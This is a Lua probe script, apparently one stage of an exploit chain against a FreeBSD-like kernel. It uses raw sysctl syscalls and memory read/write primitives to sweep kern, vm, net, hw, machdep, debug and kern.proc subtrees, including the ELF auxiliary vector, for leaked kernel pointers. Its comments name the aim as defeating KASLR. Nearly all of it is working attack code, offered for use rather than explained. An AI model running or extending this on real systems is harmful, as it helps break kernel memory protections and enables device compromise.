-- CRASH_CLASS: LOW
-- PROBE 56g3: Deep sysctl scan for kernel pointer leaks
--
-- Systematic scan of sysctl trees looking for any qword in the
-- kernel VA range (0xFFFF8xxx). Previous scans checked specific
-- MIBs; this does a broad sweep of all CTL_* × subtree combos.
--
-- Also test: kern.proc subtrees we haven't tried, vm.*, net.*

print("=== PROBE 56g3: SYSCTL DEEP SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end
local function fmt_ptr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sc202 = mk(202)
local mib = memory.alloc(24)
local outbuf = memory.alloc(0x1000)
local oldlenp = memory.alloc(8)

local function try_sysctl(mib_vals, mib_len, label, max_size)
    max_size = max_size or 256
    for i = 0, 23, 4 do wd(N(mib) + i, 0) end
    for i, v in ipairs(mib_vals) do wd(N(mib) + (i - 1) * 4, v) end

    -- First: size query
    wq(oldlenp, uint64(0))
    local ok, ret = pcall(function()
        return sc202(uint64(N(mib)), uint64(mib_len), uint64(0),
            uint64(N(oldlenp)), uint64(0), uint64(0))
    end)
    if not ok or N(ret) ~= 0 then return nil end

    local _, need = get_hi_lo(rq(N(oldlenp)))
    if need == 0 or need > max_size then return nil end

    -- Read data
    for i = 0, math.min(need + 7, 0xFFF), 4 do wd(N(outbuf) + i, 0) end
    wq(oldlenp, uint64(need + 8))
    ok, ret = pcall(function()
        return sc202(uint64(N(mib)), uint64(mib_len), uint64(N(outbuf)),
            uint64(N(oldlenp)), uint64(0), uint64(0))
    end)
    if not ok or N(ret) ~= 0 then return nil end

    local got = N(rq(N(oldlenp)))
    if got < 8 then return nil end

    -- Scan for kernel pointers
    local kptrs = {}
    for off = 0, got - 8, 4 do
        local val = rq(N(outbuf) + off)
        if val and is_kptr(val) then
            kptrs[#kptrs + 1] = {off = off, val = fmt_ptr(val)}
        end
    end
    return got, kptrs
end

-- ============ SECTION A: CTL_KERN (1) subtrees ============
print("--- SECTION A: CTL_KERN (1) subtrees ---")

local kern_names = {
    [1] = "ostype", [2] = "osrelease", [3] = "osrev", [4] = "version",
    [5] = "maxvnodes", [6] = "maxproc", [7] = "maxfiles", [8] = "argmax",
    [9] = "securelevel", [10] = "hostname", [11] = "hostid",
    [12] = "clockrate", [13] = "vnode", [14] = "proc",
    [15] = "file", [16] = "prof", [17] = "posix1version",
    [18] = "ngroups", [19] = "job_control", [20] = "saved_ids",
    [21] = "boottime", [22] = "nisdomainname", [23] = "updateinterval",
    [24] = "osreldate", [25] = "bootfile", [26] = "maxfilesperproc",
    [27] = "maxprocperuid",
}

local total_kptrs = 0
for sub = 1, 50 do
    local got, kptrs = try_sysctl({1, sub}, 2, "kern." .. (kern_names[sub] or tostring(sub)))
    if got then
        local name = kern_names[sub] or tostring(sub)
        if kptrs and #kptrs > 0 then
            for _, kp in ipairs(kptrs) do
                print(string.format("  *** kern.%s +%d: %s ***", name, kp.off, kp.val))
                total_kptrs = total_kptrs + 1
            end
        end
    end
end

-- ============ SECTION B: CTL_VM (2) subtrees ============
print("")
print("--- SECTION B: CTL_VM (2) subtrees ---")

for sub = 1, 30 do
    local got, kptrs = try_sysctl({2, sub}, 2, "vm." .. sub)
    if got then
        if kptrs and #kptrs > 0 then
            for _, kp in ipairs(kptrs) do
                print(string.format("  *** vm.%d +%d: %s ***", sub, kp.off, kp.val))
                total_kptrs = total_kptrs + 1
            end
        end
    end
end

-- ============ SECTION C: CTL_NET (4) subtrees ============
print("")
print("--- SECTION C: CTL_NET (4) subtrees ---")

-- PF_ROUTE stuff we already tested, but let's also try PF_INET, PF_INET6
-- net.inet: {4, 2, ...}
-- net.inet6: {4, 28, ...}
local net_subtrees = {
    {name = "inet.ip.stats", mib = {4, 2, 0, 0}},        -- IPPROTO_IP, IPCTL_STATS
    {name = "inet.tcp.stats", mib = {4, 2, 6, 0}},        -- IPPROTO_TCP
    {name = "inet.udp.stats", mib = {4, 2, 17, 0}},       -- IPPROTO_UDP
    {name = "inet.icmp.stats", mib = {4, 2, 1, 0}},       -- IPPROTO_ICMP
    {name = "inet6.ip6.stats", mib = {4, 28, 41, 6}},     -- IPV6CTL_STATS
}

for _, st in ipairs(net_subtrees) do
    local got, kptrs = try_sysctl(st.mib, #st.mib, st.name, 4096)
    if got then
        print(string.format("  %s: %d bytes", st.name, got))
        if kptrs and #kptrs > 0 then
            for _, kp in ipairs(kptrs) do
                print(string.format("    *** +%d: %s ***", kp.off, kp.val))
                total_kptrs = total_kptrs + 1
            end
        end
    end
end

-- ============ SECTION D: CTL_HW (6) subtrees ============
print("")
print("--- SECTION D: CTL_HW (6) subtrees ---")

local hw_names = {
    [1] = "machine", [2] = "model", [3] = "ncpu", [4] = "byteorder",
    [5] = "physmem", [6] = "usermem", [7] = "pagesize",
}

for sub = 1, 20 do
    local got, kptrs = try_sysctl({6, sub}, 2, "hw." .. (hw_names[sub] or tostring(sub)))
    if got then
        local name = hw_names[sub] or tostring(sub)
        if kptrs and #kptrs > 0 then
            for _, kp in ipairs(kptrs) do
                print(string.format("  *** hw.%s +%d: %s ***", name, kp.off, kp.val))
                total_kptrs = total_kptrs + 1
            end
        else
            -- Print non-string data for hw subtrees
            if got <= 8 then
                local val = rq(N(outbuf))
                print(string.format("  hw.%s: %d bytes val=%s", name, got, fmt_ptr(val)))
            else
                print(string.format("  hw.%s: %d bytes (no kptrs)", name, got))
            end
        end
    end
end

-- ============ SECTION E: CTL_MACHDEP (7) subtrees ============
print("")
print("--- SECTION E: CTL_MACHDEP (7) subtrees ---")

for sub = 1, 30 do
    local got, kptrs = try_sysctl({7, sub}, 2, "machdep." .. sub)
    if got then
        if kptrs and #kptrs > 0 then
            for _, kp in ipairs(kptrs) do
                print(string.format("  *** machdep.%d +%d: %s ***", sub, kp.off, kp.val))
                total_kptrs = total_kptrs + 1
            end
        end
    end
end

-- ============ SECTION F: CTL_DEBUG (5) subtrees ============
print("")
print("--- SECTION F: CTL_DEBUG (5) subtrees ---")

for sub = 1, 20 do
    local got, kptrs = try_sysctl({5, sub}, 2, "debug." .. sub)
    if got then
        if kptrs and #kptrs > 0 then
            for _, kp in ipairs(kptrs) do
                print(string.format("  *** debug.%d +%d: %s ***", sub, kp.off, kp.val))
                total_kptrs = total_kptrs + 1
            end
        end
    end
end

-- ============ SECTION G: kern.proc subtrees ============
print("")
print("--- SECTION G: kern.proc subtrees ---")

-- kern.proc: {1, 14, subcmd, pid}
-- Known: 1=PID, 12=PATHNAME, 32=VMMAP (blocked)
-- Others: 2=PGRP, 3=SESSION, 4=TTY, 5=UID, 6=RUID, 7=ARGS, 8=PROC,
--         9=SV_NAME, 10=GROUPS, 11=ENV, 13=OVMMAP, 14=OFILEDESC,
--         32=VMMAP, 33=FILEDESC, 35=GROUPS, 36=UMASK, 38=OSREL,
--         39=SIGTRAMP, 40=CRED, 41=AUXV, 42=NFDS
local proc_subs = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
                   32, 33, 35, 36, 38, 39, 40, 41, 42}

for _, sub in ipairs(proc_subs) do
    local got, kptrs = try_sysctl({1, 14, sub, pid}, 4, "kern.proc." .. sub, 4096)
    if got then
        print(string.format("  kern.proc.%d: %d bytes, %d kptrs", sub, got, kptrs and #kptrs or 0))
        if kptrs and #kptrs > 0 then
            for _, kp in ipairs(kptrs) do
                print(string.format("    *** +%d: %s ***", kp.off, kp.val))
                total_kptrs = total_kptrs + 1
            end
        end
    end
end

-- ============ SECTION H: kern.proc.auxv (interesting: ELF auxiliary vector) ============
-- auxv contains AT_BASE (interpreter base), AT_ENTRY, AT_PHDR etc.
-- These are userland addresses but if the kernel leaks its own base through
-- some auxiliary vector entry, that's KASLR defeat.
print("")
print("--- SECTION H: kern.proc.auxv detail ---")

local got_auxv, kptrs_auxv = try_sysctl({1, 14, 41, pid}, 4, "kern.proc.auxv", 4096)
if got_auxv then
    print(string.format("  auxv: %d bytes", got_auxv))
    -- Dump as type/value pairs (each entry is 16 bytes on amd64: u64 type, u64 value)
    for off = 0, got_auxv - 16, 16 do
        local atype = rq(N(outbuf) + off)
        local aval = rq(N(outbuf) + off + 8)
        local th, tl = get_hi_lo(atype)
        local at = tl
        local kp = is_kptr(aval) and " *** KPTR ***" or ""
        print(string.format("    AT_%d: %s%s", at, fmt_ptr(aval), kp))
        if at == 0 then break end  -- AT_NULL
    end
else
    print("  auxv: not available")
end

-- ============ SUMMARY ============
print("")
print(string.format("Total kernel pointers found: %d", total_kptrs))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56g3 COMPLETE ===")
